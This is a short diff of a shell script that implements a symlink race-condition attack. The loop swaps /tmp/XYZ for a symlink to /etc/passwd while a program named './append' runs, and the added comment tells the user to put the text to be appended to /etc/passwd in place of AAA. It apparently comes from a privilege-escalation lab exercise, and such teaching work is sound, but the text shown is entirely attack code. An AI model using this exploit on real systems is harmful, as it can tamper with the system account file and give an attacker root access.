@@ -381,6 +381,7 @@ LIMIT=10
 for ((i=0; i < LIMIT; i=i+1)); do
   rm -rf /tmp/XYZ
   touch /tmp/XYZ
+  # replace AAA with the text you want appended to /etc/passwd
   (echo AAA | nice 19 ./append) &
   unlink /tmp/XYZ
   ln -s /etc/passwd /tmp/XYZ 
